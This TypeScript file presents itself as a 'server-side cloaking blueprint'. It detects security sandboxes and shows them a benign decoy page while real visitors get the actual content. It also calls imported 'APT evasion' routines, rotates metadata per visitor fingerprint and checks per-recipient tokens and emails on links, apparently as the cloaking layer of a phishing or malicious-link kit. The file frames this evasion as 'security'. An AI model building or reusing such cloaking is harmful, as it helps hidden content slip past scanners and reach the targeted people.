/**
 * SERVER-SIDE CLOAKING BLUEPRINT
 * 
 * Protects backend while keeping frontend clean
 * All access control, validation, and security happens server-side
 * Frontend only renders safe, clean HTML
 * 
 * Principles:
 * - Access control: Server-side only
 * - Token validation: Server-side only
 * - Rate limiting: Server-side only
 * - Security logging: Server-side only
 * - Frontend: Clean HTML, no security logic
 */

import { getSafeMetadata, type SafeMetadata, generateSafeMetaTags } from './safeMetadata'
import { detectSandbox, type SandboxDetectionResult } from '@/lib/sandboxDetection'
import { executeAPTEvasion, type APTEvasionResult, getRecommendedCloakingLevel } from './aptEvasion'

export interface ServerSideCloakingConfig {
  // Access control (server-side only)
  validateToken: boolean
  validateEmail: boolean
  applyRateLimit: boolean
  logSecurityEvents: boolean
  
  // Content delivery
  showRealContentFirst: boolean
  useSafeMetadata: boolean
  enableMetadataRotation: boolean
  
  // Cloaking level
  cloakingLevel: 'low' | 'medium' | 'high' | 'enterprise' | 'apt'
  
  // Sandbox handling
  detectSandbox: boolean
  showBenignForSandbox: boolean
}

export interface ServerSideCloakingResult {
  // Access decision (server-side)
  allowAccess: boolean
  accessReason: string
  
  // Content to show
  showRealContent: boolean
  showBenignContent: boolean
  benignTemplate?: string
  
  // Metadata
  metadata: SafeMetadata
  
  // Cloaking status
  cloakingActive: boolean
  aptEvasion?: APTEvasionResult
  
  // Sandbox detection
  sandboxDetected: boolean
  sandboxResult?: SandboxDetectionResult
  
  // Security logging
  securityEvents: string[]
}

/**
 * Server-side cloaking blueprint
 * All security logic runs here, frontend receives clean HTML
 */
export async function applyServerSideCloaking(
  request: {
    headers: Record<string, string>
    ip: string
    userAgent: string
    fingerprint?: string
    token?: string
    email?: string
    requestCount?: number
  },
  config: Partial<ServerSideCloakingConfig> = {}
): Promise<ServerSideCloakingResult> {
  const defaultConfig: ServerSideCloakingConfig = {
    validateToken: true,
    validateEmail: true,
    applyRateLimit: true,
    logSecurityEvents: true,
    showRealContentFirst: true,
    useSafeMetadata: true,
    enableMetadataRotation: true,
    cloakingLevel: 'enterprise',
    detectSandbox: true,
    showBenignForSandbox: true,
  }

  const finalConfig = { ...defaultConfig, ...config }
  const securityEvents: string[] = []
  let allowAccess = true
  let accessReason = 'allowed'
  let showRealContent = true
  let showBenignContent = false
  let benignTemplate: string | undefined
  let sandboxDetected = false
  let sandboxResult: SandboxDetectionResult | undefined
  let aptEvasion: APTEvasionResult | undefined

  // ============================================
  // STEP 1: SERVER-SIDE ACCESS CONTROL
  // ============================================
  if (finalConfig.validateToken && request.token) {
    // Token validation happens server-side (in API routes)
    // This is just a placeholder - actual validation in /api/management/link-status
    securityEvents.push('Token validation: server-side check')
  }

  if (finalConfig.validateEmail && request.email) {
    // Email validation happens server-side (in API routes)
    // This is just a placeholder - actual validation in /api/management/link-status
    securityEvents.push('Email validation: server-side check')
  }

  if (finalConfig.applyRateLimit) {
    // Rate limiting happens server-side (in middleware/API routes)
    securityEvents.push('Rate limiting: server-side check')
  }

  // ============================================
  // STEP 2: SANDBOX DETECTION (Server-Side)
  // ============================================
  if (finalConfig.detectSandbox) {
    try {
      const requestObj = new Request('https://example.com', {
        headers: request.headers as HeadersInit,
      })
      sandboxResult = await detectSandbox(requestObj)
      sandboxDetected = sandboxResult.isSandbox

      if (sandboxDetected && finalConfig.showBenignForSandbox) {
        showBenignContent = true
        showRealContent = false
        benignTemplate = getBenignTemplate()
        securityEvents.push(`Sandbox detected (confidence: ${sandboxResult.confidence}%) - showing benign content`)
      } else if (sandboxDetected) {
        allowAccess = false
        accessReason = 'sandbox_detected'
        securityEvents.push(`Sandbox detected (confidence: ${sandboxResult.confidence}%) - access denied`)
      }
    } catch (error) {
      securityEvents.push('Sandbox detection: error (proceeding)')
    }
  }

  // ============================================
  // STEP 3: APT EVASION (Server-Side)
  // ============================================
  if (request.fingerprint && allowAccess) {
    const aptConfig = getRecommendedCloakingLevel(finalConfig.cloakingLevel)
    aptEvasion = await executeAPTEvasion(
      {
        fingerprint: request.fingerprint,
        requestCount: request.requestCount || 1,
        headers: request.headers,
        userAgent: request.userAgent,
      },
      aptConfig
    )

    if (aptEvasion.cloakingActive) {
      securityEvents.push(`APT evasion active: ${aptEvasion.cloakingTechniques.length} techniques`)
    }
  }

  // ============================================
  // STEP 4: SAFE METADATA (Server-Side)
  // ============================================
  const metadata = finalConfig.useSafeMetadata
    ? getSafeMetadata(finalConfig.enableMetadataRotation ? request.fingerprint : undefined)
    : getSafeMetadata()

  // ============================================
  // STEP 5: CONTENT DELIVERY DECISION
  // ============================================
  if (finalConfig.showRealContentFirst && allowAccess && !sandboxDetected) {
    showRealContent = true
    securityEvents.push('Content delivery: real content (safe)')
  }

  // ============================================
  // STEP 6: SECURITY LOGGING (Server-Side)
  // ============================================
  if (finalConfig.logSecurityEvents && securityEvents.length > 0) {
    // Logging happens server-side (in API routes)
    // This is just a placeholder
  }

  return {
    allowAccess,
    accessReason,
    showRealContent,
    showBenignContent,
    benignTemplate,
    metadata,
    cloakingActive: aptEvasion?.cloakingActive || false,
    aptEvasion,
    sandboxDetected,
    sandboxResult,
    securityEvents,
  }
}

/**
 * Get benign template for sandbox detection
 */
function getBenignTemplate(): string {
  // Return a safe, benign template URL
  // This should be a real, legitimate-looking page
  const benignTemplates = [
    'https://example.com/company-news',
    'https://example.com/about',
    'https://example.com/resources',
  ]
  return benignTemplates[Math.floor(Math.random() * benignTemplates.length)]
}

/**
 * Generate clean, safe HTML for frontend
 * No security logic, just clean HTML
 */
export function generateSafeHTML(metadata: SafeMetadata, content: string): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  ${generateSafeMetaTags(metadata)}
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      line-height: 1.6;
      color: #333;
      max-width: 1200px;
      margin: 0 auto;
      padding: 20px;
    }
    .container {
      background: #fff;
      border-radius: 8px;
      padding: 40px;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    h1 {
      color: #2c3e50;
      margin-bottom: 20px;
    }
    .content {
      color: #555;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>${escapeHtml(metadata.title)}</h1>
    <div class="content">
      ${content}
    </div>
  </div>
</body>
</html>`
}

// generateSafeMetaTags is imported from safeMetadata.ts above

function escapeHtml(text: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;',
  }
  return text.replace(/[&<>"']/g, (m) => map[m])
}

